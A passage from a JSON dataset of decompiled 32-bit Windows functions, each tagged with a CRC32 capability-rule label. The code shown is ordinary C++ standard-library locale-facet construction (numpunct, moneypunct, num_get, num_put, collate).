        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a59b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::money_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 501
    },
    "0042a618": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a618(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(ppcVar3 + 10) = 1;\n            fcn.0042eb37(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_unsigned_short_int__1_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 565
    },
    "0042a6b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a6b1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(ppcVar3 + 10) = 0;\n            fcn.0042eb37(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_unsigned_short_int__0_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 567
    },
    "0042a74b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a74b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_wchar_t_.0;\n            *(ppcVar3 + 10) = 1;\n            fcn.0042ec0d(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_wchar_t__1_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 567
    },
    "0042a7e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a7e4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x58, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::_Mpunct_wchar_t_.0;\n            *(ppcVar3 + 10) = 0;\n            fcn.0042ec0d(uVar5, 1);\n            *ppcVar3 = vtable.std::moneypunct_wchar_t__0_.0;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 568
    },
    "0042a87e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a87e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::num_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 503
    },
    "0042a8fb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a8fb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::num_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 501
    },
    "0042a978": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a978(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::num_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 502
    },
    "0042a9f5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042a9f5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(8, arg_8h_01);\n        *(unaff_EBP + -0x10) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            fcn.004015d0(arg_8h_00);\n            *ppcVar3 = \n            vtable.std::num_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            bVar4 = true;\n            ppcVar3[1] = NULL;\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 502
    },
    "0042aa72": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042aa72(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x18, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::numpunct_unsigned_short_int_.0;\n            fcn.0042ed1e(uVar5, 1);\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 530
    },
    "0042ab02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ab02(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    int32_t arg_8h_00;\n    bool bVar4;\n    int32_t unaff_EBP;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar3 = fcn.0043a4f7(0x18, uVar5);\n        *(unaff_EBP + -0x14) = ppcVar3;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar3 == NULL) {\n            ppcVar3 = NULL;\n        }\n        else {\n            iVar2 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar2 == 0) {\n                arg_8h_00 = 0x486181;\n            }\n            else {\n                arg_8h_00 = *(iVar2 + 0x18);\n                if (arg_8h_00 == 0) {\n                    arg_8h_00 = iVar2 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(arg_8h_00);\n            ppcVar3[1] = NULL;\n            bVar4 = true;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar3 = vtable.std::numpunct_wchar_t_.0;\n            fcn.0042ee17(uVar5, 1);\n        }\n        *piVar1 = ppcVar3;\n        if (bVar4) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 529
    },
    "0042ab92": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ab92(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x44, uVar5);\n        *(unaff_EBP + -0x14) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            iVar4 = fcn.00429330(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "0042ac13": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ac13(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x3c;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0x44, uVar5);\n        *(unaff_EBP + -0x14) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            iVar4 = fcn.00429363(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "0042ac94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ac94(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0xc, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.00429396(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 417
    },
    "0042ad0f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ad0f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar5;\n    \n    uVar5 = 0x38;\n    fcn.0043acd3();\n    piVar1 = *(unaff_EBP + 8);\n    iVar4 = 0;\n    bVar3 = false;\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0043a4f7(0xc, uVar5);\n        *(unaff_EBP + -0x10) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 != 0) {\n            iVar4 = *(*(unaff_EBP + 0xc) + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0x486181;\n            }\n            else {\n                iVar2 = *(iVar4 + 0x18);\n                if (iVar2 == 0) {\n                    iVar2 = iVar4 + 0x1c;\n                }\n            }\n            uVar5 = fcn.004015d0(iVar2);\n            bVar3 = true;\n            iVar4 = fcn.004293c9(uVar5, 0);\n        }\n        *piVar1 = iVar4;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 419
    },
    "004353db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004353db(uint arg_8h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.0043ad07(0x38);\n    *(unaff_EBP + -0x44) = 0;\n    iVar3 = *(extraout_ECX + 4);\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x18) = 0;\n        *(unaff_EBP + -0x14) = 0xf;\n        *(unaff_EBP + -0x28) = 0;\n        iVar3 = unaff_EBP + -0x28;\n        bVar2 = true;\n        bVar1 = false;\n    }\n    else {\n        arg_8h_00 = *(iVar3 + 0x18);\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = iVar3 + 0x1c;\n        }\n        iVar3 = fcn.00405750(arg_8h_00);\n        bVar2 = false;\n        bVar1 = true;\n    }\n    fcn.004056d0(iVar3);\n    if (bVar1) {\n        fcn.00406810();\n    }\n    if (bVar2) {\n        fcn.00406810();\n    }\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 379
    },
    "00435df9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00435df9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    code **ppcVar5;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    ulong uVar6;\n    uint var_68h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_4h;\n    uint arg_8h_01;\n    \n    arg_8h_01 = 0x5c;\n    fcn.0043ad07();\n    piVar1 = *(unaff_EBP + 8);\n    bVar4 = false;\n    bVar3 = false;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x30) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar5 = fcn.0043a4f7(0x10, arg_8h_01);\n        *(unaff_EBP + -0x34) = ppcVar5;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar5 == NULL) {\n            ppcVar5 = NULL;\n        }\n        else {\n            arg_8h_00 = fcn.004353db(unaff_EBP + -0x28);\n            uVar2 = arg_8h_00[5];\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x30) = 1;\n            if (0xf < uVar2) {\n                arg_8h_00 = *arg_8h_00;\n            }\n            fcn.004015d0(arg_8h_00);\n            ppcVar5[1] = NULL;\n            bVar4 = true;\n            bVar3 = true;\n            *ppcVar5 = vtable.std::collate_char_.0;\n            uVar6 = fcn.00439a13();\n            ppcVar5[2] = uVar6;\n            ppcVar5[3] = uVar6 >> 0x20;\n        }\n        *piVar1 = ppcVar5;\n        if (bVar3) {\n            fcn.004016b0();\n        }\n        if (bVar4) {\n            fcn.00406810();\n        }\n    }\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 608
    },
    "00435e9b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
